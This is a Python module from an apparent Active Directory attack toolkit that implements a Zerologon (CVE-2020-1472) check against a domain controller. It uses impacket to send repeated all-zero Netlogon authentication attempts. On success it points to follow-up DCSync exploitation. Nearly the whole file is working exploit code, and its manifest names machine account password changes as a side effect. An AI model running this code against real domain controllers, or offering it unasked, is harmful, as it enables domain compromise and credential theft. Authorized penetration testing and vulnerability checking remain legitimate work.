"""Zerologon (CVE-2020-1472) — check and exploit Netlogon vulnerability."""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.attack.zerologon.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["netlogon_authentication_attempt", "machine_account_password_change"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1210"],
    "cve": "CVE-2020-1472",
}

MAX_ATTEMPTS = 2000


def run(args: Any) -> int:
    print(f"[*] Zerologon (CVE-2020-1472) → {args.target} ({args.domain})")

    try:
        from impacket.dcerpc.v5 import nrpc, epm, transport
        from impacket.dcerpc.v5.dtypes import NULL
    except ImportError:
        print("[!] impacket not installed: pip install impacket", file=sys.stderr)
        return 1

    dc_name = args.target.split(".")[0].upper()
    if "." in args.target:
        dc_handle = f"\\\\{dc_name}"
    else:
        dc_handle = f"\\\\{args.target}"

    print(f"[*] DC name: {dc_name}")
    print(f"[*] Performing Zerologon check (up to {MAX_ATTEMPTS} attempts)...")

    binding = epm.hept_map(args.target, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
    dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)

    plaintext = b"\x00" * 8
    ciphertext = b"\x00" * 8

    for attempt in range(MAX_ATTEMPTS):
        try:
            resp = nrpc.hNetrServerAuthenticate3(
                dce, dc_handle + "\x00",
                dc_name + "$\x00",
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                dc_name + "\x00",
                ciphertext, 0x212fffff,
            )

            if resp["ErrorCode"] == 0:
                print(f"\n[+] VULNERABLE! Authentication succeeded at attempt {attempt + 1}")
                print("[+] The DC accepted an all-zero client credential")
                print("[!] WARNING: Exploitation changes the DC machine account password!")
                print("[*] To exploit: use the authenticated session to perform DCSync")
                print("[*] Remember to restore the original password afterward")
                dce.disconnect()
                return 0

        except nrpc.DCERPCSessionError as exc:
            if "STATUS_ACCESS_DENIED" not in str(exc):
                print(f"\n[-] Unexpected error at attempt {attempt}: {exc}", file=sys.stderr)
                dce.disconnect()
                return 1

        if attempt % 100 == 0 and attempt > 0:
            sys.stdout.write(f"\r[*] Attempt {attempt}/{MAX_ATTEMPTS}...")
            sys.stdout.flush()

    print(f"\n[-] Not vulnerable after {MAX_ATTEMPTS} attempts (patched)")
    dce.disconnect()
    return 0
